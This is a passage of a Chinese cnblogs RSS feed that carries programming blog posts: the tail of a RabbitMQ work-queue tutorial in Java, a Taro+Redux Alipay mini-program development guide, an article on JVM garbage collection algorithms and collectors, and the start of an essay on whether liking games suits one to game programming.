&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; Connection connection =&lt;span&gt; factory.newConnection();
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; Channel channel =&lt;span&gt; connection.createChannel();
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt;     channel.queueDeclare(TASK_QUEUE_NAME, &lt;span&gt;true&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;     System.out.println(&quot; [*] Waiting for messages. To exit press CTRL+C&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; 
&lt;span&gt;19&lt;/span&gt;     channel.basicQos(1&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; 
&lt;span&gt;21&lt;/span&gt;     DeliverCallback deliverCallback = (consumerTag, delivery) -&amp;gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;         String message = &lt;span&gt;new&lt;/span&gt; String(delivery.getBody(), &quot;UTF-8&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; 
&lt;span&gt;24&lt;/span&gt;         System.out.println(&quot; [x] Received '&quot; + message + &quot;'&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;            doWork(message);
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt;             System.out.println(&quot; [x] Done&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;             channel.basicAck(delivery.getEnvelope().getDeliveryTag(), &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt; &lt;span&gt;    };
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;     channel.basicConsume(TASK_QUEUE_NAME, &lt;span&gt;false&lt;/span&gt;, deliverCallback, consumerTag -&amp;gt;&lt;span&gt; { });
&lt;/span&gt;&lt;span&gt;33&lt;/span&gt; &lt;span&gt;  }
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt; 
&lt;span&gt;35&lt;/span&gt;   &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; doWork(String task) {
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt;     &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;char&lt;/span&gt;&lt;span&gt; ch : task.toCharArray()) {
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (ch == '.'&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;38&lt;/span&gt;             &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;39&lt;/span&gt;                 Thread.sleep(1000&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt;             } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException _ignored) {
&lt;/span&gt;&lt;span&gt;41&lt;/span&gt; &lt;span&gt;                Thread.currentThread().interrupt();
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;43&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;44&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt; &lt;span&gt;  }
&lt;/span&gt;&lt;span&gt;46&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　至此，工作队列模式讲解完了，下一章，将讲解发布-订阅模式。&lt;/p&gt;
</description>
<pubDate>Tue, 30 Apr 2019 15:25:00 +0000</pubDate>
<dc:creator>无恨之都</dc:creator>
<og:description>在上一章的指南中，我们写了一个命名队列：生产者往该命名队列发送消息、消费从从该命名队列中消费消息。在本章中，我们将创建一个工作队列，用于在多个工作者之间分配耗时的任务。工作队列(即任务队列)的主要思想</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wuhenzhidu/p/10787702.html</dc:identifier>
</item>
<item>
<title>Tarojs+redux支付宝小程序开发攻略 - 散场丶丶</title>
<link>http://www.cnblogs.com/sanchang/p/10790052.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sanchang/p/10790052.html</guid>
<description>&lt;h3 id=&quot;技术选型&quot;&gt;技术选型&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;   对于习惯react语法的开发者来讲，RN是实现native的必备工具。 我们甚至可以屏蔽官方稳定而强大的配置层，直接上手开发。
   而后，同为表层React语法的Rax、Taro这样的开源多端开发框架的兴起，让react开发人员得以不必在多端投入更高的成本。反过来，只要有足够的移动端开发经验(主要体现在多端机型兼容这方面)，那么这些开源的多端框架就会成为你手中的神器，让你几乎零成本get到碎片化多端开发技能。
    Taro相对于Rax的优势是，在国内的开源社区更为活跃(论中文文档的重要性)，集成的端更多(包括不限于h5，native与各类小程序)，集成的功能更多, 语法限制与RN相去不远(基于集成注册RN中间层实现的Native)。
    虽然Taro集成的端数比较多，但在开发过程中，我们可针对一类单独watch，build，每一类的官方调试方案与端官方(如蚂蚁金服支付宝小程序)的调试工具无缝对接。
    集成Redux而不是mobX，则是单纯的基于技术熟练度的思考（实际上mobX在开发范式上更高层一些）。&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;支付宝小程序端开发准备&quot;&gt;支付宝小程序端开发准备&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;    我曾思考一个很有深度的问题，混合开发的难点是在哪。
    这个问题大概三秒钟就有了答案：
    1环境配置  ； 2调试兼容

    那么基于上述两个问题中的第一个，Taro在官方文档中已经给出了解决方案——基于taro的配置，我们只需要简单地修改几个配置字段即可。
    后面有详细的流程。
    
    折回开发准备： 
   1 需要node开发环境(这是句废话); 
   2 taro脚手架 运行的时候选择集成redux; 
   3 安官方文档中这里，点击下图红框中的链接，下载并安装支付宝调试工具。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1425733/201904/1425733-20190429131417547-882683762.png&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;   4 申请项目调试权限(按蚂蚁金服支付宝小程序官方文档走简单流程。链接地址：https://docs.alipay.com/mini/developer/getting-started/ )&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;脚手架简单配置&quot;&gt;脚手架简单配置。&lt;/h3&gt;
&lt;h4 id=&quot;css模块化配置&quot;&gt;1 css模块化配置&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;taro的css模块化目前支持基于hash随机值的模块化(等同于css-modules)，配置极为简单， 如官方所示：
https://nervjs.github.io/taro/docs/css-modules.html
这里直接给出链接，对应修改两个bool参数即可。
但要注意的是：  在css的命名上：
要以 name.module.css(/less/sass)的形式——
如：  index.module.less 
在使用时，以json变量的形式引入并使用，如代码所示&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;    import styles from './index.module.less'

    class Demo extends Component {
        render () {
            return (
              &amp;lt;View className={styles.wrap}&amp;gt;
                &amp;lt;Text className={styles.demoText}&amp;gt;
                     demo
                 &amp;lt;/Text&amp;gt;
              &amp;lt;/View&amp;gt;
            )
        }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt; 当然，除开上述方式，我们也可以用css in js的方式实现，这点上几乎所有表层react语法的多端框架都支持：&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;    import styles from './index.module.less'

    const demoStyle = {
        width: '300px',
        height: '300px'
    }
    class Demo extends Component {
        render () {
            return (
              &amp;lt;View style={demoStyle}&amp;gt;
                &amp;lt;Text &amp;gt;
                     demo
                 &amp;lt;/Text&amp;gt;
              &amp;lt;/View&amp;gt;
            )
        }
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;但要注意的是，上述写法中的单位px，不会被转化成对应的rem，而用css-modules的形式，会默认以iphone6的尺寸给转化成rem(省去了很多麻烦)。
实际上，我个人认为css in js的形式更能体现组件化开发的思想，但在tarojs里，建议还是用css-modules，亲测比较成熟，没有出任何问题。&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;redux配置&quot;&gt;2 redux配置&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt; 在“开局”选择redux集成时，展开的taro框架里，已经给集成了redux的使用demo。
 使用总结来讲，即，三个文件夹。
     &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1425733/201904/1425733-20190430220012806-463312320.png&quot;/&gt;&lt;br/&gt;如图，actions，constants，reduces里的文件应该与pages里每个pege名一一对应(目录统一，更加清晰)。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;要注意的是，如果store里使用的是下图中的中间件(默认生成使用就这个)，那么在写异步action时，请用promise，而不应该用generetor函数&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1425733/201904/1425733-20190430220325884-869914273.png&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;异步action的就可以这么写：&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;//postReq是基于fetch封装了请求头的请求函数
export  function fetchData (payload){
  const {params={},callback} = payload;
  return dispatch=&amp;gt;{
    postReq(url,{
      params,
      callback
    })
    .then(
      res=&amp;gt;{
        if(res.status){
          dispatch({
            type: FETCHDATA
            data: res.data
          })
        }
      }
    )
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;开发注意事项&quot;&gt;开发注意事项&lt;/h3&gt;
&lt;h4 id=&quot;阻止事件冒泡&quot;&gt;1 阻止事件冒泡&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;如果有特殊的情况，需要阻止实践冒泡，在官方中提供了针对此需求的api，但在支付宝小程序端似乎不太好用(亲测不起效),解决方案是：
 用一个实例属性控制，在第一次触发的点击事件里修改实例属性值，冒泡触发的事件里基于这个实例属性做逻辑,如：&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;    handleWrapClick = ()=&amp;gt;{
        if(this.isStop){
            return null
        }
        this.goHome() //跳转到Home页
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;jsx只能写在render注意以下代码在支付宝小程序端是不起效的&quot;&gt;2 jsx只能写在render，注意，以下代码在支付宝小程序端是不起效的：&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;    class Demo extends Component {
        //在下面的这个实例方法里写jsx是不起效的
        renderText = ()=&amp;gt;(
            &amp;lt;Text&amp;gt;
                demo
             &amp;lt;/Text&amp;gt;
        )
        render () {
            const text = this.renderText();
            return (
              &amp;lt;View style={demoStyle}&amp;gt;
                   {text}
              &amp;lt;/View&amp;gt;
            )
        }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们应该写成下面的方式：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;     class Demo extends Component {
        //jsx必须写在render里
        render () {
            const text = (
                &amp;lt;Text&amp;gt;
                    demo
                 &amp;lt;/Text&amp;gt;
            );
            return (
              &amp;lt;View style={demoStyle}&amp;gt;
                   {text}
              &amp;lt;/View&amp;gt;
            )
        }
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述问题跟taro的render解决方案有关&lt;/p&gt;
</description>
<pubDate>Tue, 30 Apr 2019 14:21:00 +0000</pubDate>
<dc:creator>散场丶丶</dc:creator>
<og:description>tarojs+redux支付宝小程序端开发实践</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sanchang/p/10790052.html</dc:identifier>
</item>
<item>
<title>Java虚拟机四：垃圾回收算法与垃圾收集器 - 码农大卫</title>
<link>http://www.cnblogs.com/fengweiweicoder/p/10787454.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fengweiweicoder/p/10787454.html</guid>
<description>&lt;p&gt;　　在Java运行时的几个数据区域中，程序计数器，虚拟机栈，本地方法栈3个区域随着线程而生，随线程而灭，因此这几个区域的内存分配和回收具有确定性，不需要过多考虑垃圾回收问题，因为方法结束或者线程结束时，内存就回收了。但是方法区和堆区不一样，一个接口或者实现类所需要的内存可能不一样，一个方法的多个分支需要的内存也可能不一样，只有程序运行时才能知道创建哪些对象，这部分内存的分配和回收是动态的。&lt;/p&gt;
&lt;p&gt;　　在进行垃圾回收时候，首先需要判断哪些对象需要回收，这就涉及到回收算法的问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、垃圾回收算法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.标记-清除算法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　标记-清除算法是一种最基础的垃圾收集算法，分为“标记”和“清除”两步。“标记”阶段标记所有需要进行垃圾回收的对象，标记完成后统一回收被标记的对象。这种算法的不足点在于：&lt;/p&gt;
&lt;p&gt;　　（1）效率问题，标记和清除两个过程效率都不高；&lt;/p&gt;
&lt;p&gt;　　（2）空间问题，标记清除后会产生大量不连续碎片，后续如果需要为较大对象分配空间，则又需触发垃圾回收。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.复制算法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　为了解决标记-清除算法的效率问题，出现了复制算法。这种算法把内存按照容量划分为大小相同的两块，每次只是用其中一块，当这块内存用完了，就把还存活的对象复制到另外一块中，并将这块的内存清理掉，然后使用另外一块，当另外一块内存用完了，再把存活的对象复制到这块中，并清理另外一块内存，依次类推。&lt;/p&gt;
&lt;p&gt;　　复制算法主要用于新生代的回收，在HotSpot虚拟机中，新生代内存划分为一块较大的Eden空间，和两块较小的Survivor空间，每次使用Eden空间和其中一块Survivor空间。当进行垃圾回收时，会把Eden空间和Survivor空间中存活的对象一次性复制到另外一块Survivor空间上，最后清理掉Eden空间和刚才使用过的Survivor空间。HotSpot虚拟机中，默认情况下Eden空间和Survivor空间的大小比例是8:1，即Eden空间占整个新生代的80%，每次新生代中使用的空间为80%+10%=90%，闲置空间10%。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.标记-整理算法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;复制算法适用于那种对象存活率较低的场景，在对象存活率较高时，使用复制收集算法意味着需要进行大量复制，会使效率降低，同时复制大量存活对象到另外一块内存，意味着需要有足够大的内存来保存这些对象，这势必会降低内存使用率。根据老年代的特点，有人提出标记-整理算法，和标记-清除算法不同的是，标记整理算法将存活的对象向一端移动，然后直接清理掉端边界之外的内存。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.分代收集算法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　目前商业虚拟机中都使用分代收集算法。一般将Java堆分为新生代和老年代，新生代进行垃圾收集发现有大量对象死去，只有少量对象存活，那么就使用复制算法。老年代中对象存活率较高，使用标记-清除算法或者标记-整理算法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二、垃圾收集器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 　　垃圾收集算法提供了内存回收的方法论，垃圾收集器是内存回收的方法论。每个厂商对垃圾收集器的实现不一样，这里主要讨论Jdk1.7 Update 14之后的HotSpot虚拟机。这个虚拟机中包含的垃圾收集器有如下7种：&lt;/p&gt;
&lt;p&gt;                                     &lt;img src=&quot;https://img2018.cnblogs.com/blog/1671546/201904/1671546-20190429213238533-337889854.png&quot; alt=&quot;&quot; width=&quot;447&quot; height=&quot;309&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　以上收集器之间如果有连线，则表明可以搭配使用，虚拟机所处区域，表示他是新生代收集器还是老年代收集器。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.Serial收集器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Serial收集器是一种最基本的单线程收集器，这种收集器工作时，必须停止其他所有工作线程，优点在于简单高效，但体验很不友好，目前主要应用场合是：虚拟机运行在Client模式下的默认新生代收集。器。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.ParNew收集器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　parNew收集器是Serial收集器的多线程版本，常用参数设置：&lt;/p&gt;
&lt;p&gt;　　 &lt;span class=&quot;cnblogs_code&quot;&gt;-XX:+UseConcMarkSweepGC&lt;/span&gt; ：设置ParNew为默认的新生代收集器；&lt;/p&gt;
&lt;p&gt;　　 &lt;span class=&quot;cnblogs_code&quot;&gt;-XX:+UseParNewGC&lt;/span&gt; ：指定使用ParNew为年轻代收集器，强制指定；&lt;/p&gt;
&lt;p&gt;　　 &lt;span class=&quot;cnblogs_code&quot;&gt;-XX:ParallelGCThreads=n&lt;/span&gt; ：设置收集器的线程数为n。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.Parallel Scavenge收集器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Parallel Scavenge收集器是一个使用复制算法的新生代收集器，这种收集器的主要目标是达到一个可控制的吞吐量（Throughput，CPU用于运行用户代码的时间与CPU总消耗时间的比值，即吞吐量=运行用户代码时间/(运行用户代码时间+垃圾收集时间)）。由于与吞吐量关系密切，故而Parallel Scavenge收集器也称为“吞吐量优先”收集器。常用参数设置：&lt;/p&gt;
&lt;p&gt;　　 &lt;span class=&quot;cnblogs_code&quot;&gt;-XX:MaxGCPauseMillis=n&lt;/span&gt; ：设置年轻代垃圾收集的最长时间；&lt;/p&gt;
&lt;p&gt;　　 &lt;span class=&quot;cnblogs_code&quot;&gt;-XX:GCTimeRatio=n&lt;/span&gt; ：设置垃圾收集总可用时长的比例，和吞吐量直接相关；&lt;/p&gt;
&lt;p&gt;　　 &lt;span class=&quot;cnblogs_code&quot;&gt;-XX:+UseAdaptiveSizePolicy&lt;/span&gt; 自适应大小开关，配置该选项之后，每次GC后会重新计算 Eden、From 和 To 区的大小，计算依据是 GC 过程中统计的 GC 时间、吞吐量、内存占用量，因此设置此参数之后就不需要再设置 &lt;span class=&quot;cnblogs_code&quot;&gt;-XX:SurvivorRatio&lt;/span&gt; 、 &lt;span class=&quot;cnblogs_code&quot;&gt;-XX:PretenureSizeThreshold&lt;/span&gt; 等参数了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.Serial Old收集器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Serial收集器的老年版本，也是一个单线程收集器，使用的是“标记-整理”算法，这种收集器的主要意义也是给Client模式下的虚拟机使用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5.Parallel Old收集器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Parallel Old收集器是Parallel Scavenge收集器的老年代版本，使用多线程和“标记-整理”算法。在注重吞吐量以及CPU资源敏感的场合，都可以优先考虑Parallel Scavenge收集器和Parallel Old收集器的组合。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6.CMS收集器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　CMS收集器是一种以获取最短回收停顿时间为目标的收集器。它基于“标记-清除”算法实现，运作过程相对于其他几种收集器更复杂一些。分为以下四个过程：&lt;/p&gt;
&lt;p&gt;　　（1）初始标记（CMS initial mark）：标记一下CG Roots能关联到的对象；&lt;/p&gt;
&lt;p&gt;　　（2）并发标记（CMS concurrent mark）：进行CG Roots Tracing的过程；&lt;/p&gt;
&lt;p&gt;　　（3）重新标记（CMS remark）：修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录。&lt;/p&gt;
&lt;p&gt;　　（4）并发清理（CMS concurrent sweep）&lt;/p&gt;
&lt;p&gt;　　CMS 收集器的优点在于并发收集，低停顿。其缺点在于以下三点：&lt;/p&gt;
&lt;p&gt;　　（1）CMS收集器对CPU很敏感，CMS默认回收线程是（CPU数量+3）/4，当CPU在4个以上时，并发收集时垃圾收集线程不少于25%的CPU资源，并随着CPU数量增加而下降。但是当CPU不足4个时，CMS对用户程序的影响就会变得很大。&lt;/p&gt;
&lt;p&gt;　　（2）CMS收集器无法处理浮动垃圾。由于CMS收集器并发清理阶段用户线程还在运行着，伴随着程序运行就会有垃圾产生，这部分垃圾在标记过后，CMS收集器无法在当次收集中清理这些垃圾。&lt;/p&gt;
&lt;p&gt;　　（3）由于CMS收集器是一种基于“标记-清除”算法的收集器，这种算法实现的收集器在收集结束后会有大量不连续碎片产生。碎片过多时会给大对象分配带来很大麻烦，往往老年代还有很大空间剩余，但是无法找到连续空间分配当前对象，因而不得不提前触发Full GC。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7.G1收集器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　G1收集器是一款面向服务端应用的垃圾收集器，与其他收集器相比，G1收集器具有如下优点：&lt;/p&gt;
&lt;p&gt;　　（1）并发与并行：G1能充分利用多CPU，多核硬件优势，使用多个CPU来减少停顿时间；&lt;/p&gt;
&lt;p&gt;　　（2）分代收集：G1不需要其他收集器配合就能独立管理整个堆的垃圾收集，且它能采用不同方式去处理新建对象和已经存活了一段时间，熬过多次GC的旧对象以获得更好的收集效果。&lt;/p&gt;
&lt;p&gt;　　（3）空间整合：使用G1收集器不会产生内存碎片，收集后能提供规整的可用内存。这种特性有利于程序长时间运行，分配大对象时候不会因为无法找到连续内存空间而提前触发下一次GC.&lt;/p&gt;
&lt;p&gt;　　（4）可预测的停顿：G1除了追求低停顿，还能建立可预测的停顿时间模型，能让使用着指定在长度为M毫秒的时间片段内，消耗在垃圾收集上的时间不超过N毫秒。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;三、垃圾收集参数总结&lt;/strong&gt;&lt;/p&gt;
&lt;table border=&quot;2&quot;&gt;&lt;tbody readability=&quot;24.5&quot;&gt;&lt;tr&gt;&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4.5&quot;&gt;&lt;td&gt;UseSerialGC&lt;/td&gt;
&lt;td readability=&quot;6&quot;&gt;
&lt;p&gt;虚拟机运行在Client模式下的默认值，打开此开关后，使用Serial+Serial Old的收集器组合进行内存回收&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;UseParNewGC&lt;/td&gt;
&lt;td&gt;打开此开关后，使用ParNew + Serial Old 的收集器组合进行内存回收&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;UseConcMarkSweepGC&lt;/td&gt;
&lt;td&gt;打开此开关后，使用ParNew + CMS + Serial Old 的收集器组合进行内存回收。Serial Old 收集器将作为CMS收集器出现Concurrent Mode Failure失败后的后备收集器使用&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;UseParallelGC&lt;/td&gt;
&lt;td&gt;虚拟机运行在Server 模式下的默认值，打开此开关后，使用Parallel Scavenge + Serial Old（PS MarkSweep）的收集器组合进行内存回收&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;UseParallelOldGC&lt;/td&gt;
&lt;td&gt;打开此开关后，使用Parallel Scavenge + Parallel Old 的收集器组合进行内存回收&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;SurvivorRatio&lt;/td&gt;
&lt;td&gt;新生代中Eden 区域与Survivor 区域的容量比值，默认为8，代表Eden ：Survivor=8∶1&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;PretenureSizeThreshold&lt;/td&gt;
&lt;td&gt;直接晋升到老年代的对象大小，设置这个参数后，大于这个参数的对象将直接在老年代分配&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;MaxTenuringThreshold&lt;/td&gt;
&lt;td&gt;晋升到老年代的对象年龄。每个对象在坚持过一次Minor GC 之后，年龄就加1，当超过这个参数值时就进入老年代&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;UseAdaptiveSizePolicy&lt;/td&gt;
&lt;td&gt;动态调整Java 堆中各个区域的大小以及进入老年代的年龄&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;HandlePromotionFailure&lt;/td&gt;
&lt;td&gt;是否允许分配担保失败，即老年代的剩余空间不足以应付新生代的整个Eden 和Survivor 区的所有对象都存活的极端情况&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;ParallelGCThreads&lt;/td&gt;
&lt;td&gt;设置并行GC 时进行内存回收的线程数&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;GCTimeRatio&lt;/td&gt;
&lt;td&gt;GC 时间占总时间的比率，默认值为99，即允许1% 的GC 时间。仅在使用Parallel Scavenge 收集器时生效&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;MaxGCPauseMillis&lt;/td&gt;
&lt;td&gt;设置GC 的最大停顿时间。仅在使用Parallel Scavenge 收集器时生效&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;CMSInitiatingOccupancyFraction&lt;/td&gt;
&lt;td&gt;设置CMS 收集器在老年代空间被使用多少后触发垃圾收集。默认值为68%，仅在使用CMS 收集器时生效&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;UseCMSCompactAtFullCollection&lt;/td&gt;
&lt;td&gt;设置CMS 收集器在完成垃圾收集后是否要进行一次内存碎片整理。仅在使用CMS 收集器时生效&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;CMSFullGCsBeforeCompaction&lt;/td&gt;
&lt;td&gt;设置CMS 收集器在进行若干次垃圾收集后再启动一次内存碎片整理，仅在使用CMS 收集器时生效&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;

&lt;p&gt;参考资料：《深入理解Java虚拟机 JVM高级特性与最佳实践 第2版》&lt;/p&gt;
</description>
<pubDate>Tue, 30 Apr 2019 14:09:00 +0000</pubDate>
<dc:creator>码农大卫</dc:creator>
<og:description>在Java运行时的几个数据区域中，程序计数器，虚拟机栈，本地方法栈3个区域随着线程而生，随线程而灭，因此这几个区域的内存分配和回收具有确定性，不需要过多考虑垃圾回收问题，因为方法结束或者线程结束时，内</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/fengweiweicoder/p/10787454.html</dc:identifier>
</item>
<item>
<title>我很喜欢玩游戏，那么我就适合做游戏程序员吗？ - 黄小斜</title>
<link>http://www.cnblogs.com/xll1025/p/10798262.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xll1025/p/10798262.html</guid>
<description>&lt;p&gt;&lt;strong&gt;作者：黄小斜&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文章来源：微信公众号【程序员江湖】&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;游戏在今天的普及度已经不是端游时代可以比肩的了。如今人手一台手机、平板就可以吃鸡、打农药，不仅是男生，也有很多女生加入了游戏圈。相信现在在看文章的你也玩游戏，虽然爱玩的程度不同，但是至少都是感兴趣的，当然你也知道，手游行业利润高，游戏程序员自然也吃香，能一边赚钱一边玩游戏，岂不是人生一大幸事呢？其实当年我也是这么想的。&lt;/p&gt;
&lt;h2&gt;为成为游戏程序员而读研&lt;/h2&gt;
&lt;p&gt;大学的时候学的专业和计算机不太沾边，对学的东西不太感兴趣，每天的生活就是上课开黑打游戏，在大学的男生宿舍里，这样的情况确实也比较普遍。恰逢做毕业设计的时候，在课题列表上看到了一个关于“unity3D游戏开发”的课题，我特别感兴趣，于是果断选择了它。当时的水平就是刚刚c语言入门，有多菜可想而知，于是跟着网上的视频撸了一个劣质的《炉石传说》出来，连一局游戏都打不完的那种。&lt;/p&gt;
&lt;p&gt;但是从那时候开始，我就感觉游戏开发确实挺有趣的。这么多年来，国内的游戏大厂也只有腾讯网易两家，网易游戏的游戏研发招聘要求就是至少要985研究生，腾讯虽然没有指定学历要求，但是要求也绝对不低。&lt;/p&gt;
&lt;p&gt;除了学历要求之外，最要命的就是技术要求了，精通C++、精通计算机图形学，最好有游戏引擎经验，对算法等计算机基础课程也要非常熟悉。&lt;/p&gt;
&lt;p&gt;简直和我毫不沾边嘛，好吧，既然我一穷二白，想要翻身的话，不是一时半会能做得到的，就算我挤破头准备一年的校园招聘，可能也离这个要求还很远，于是干脆选择读研，三年后，准备好了再来，也许胜算就比较大了吧。&lt;/p&gt;
&lt;h2&gt;兴趣和职业，有时候要有所取舍&lt;/h2&gt;
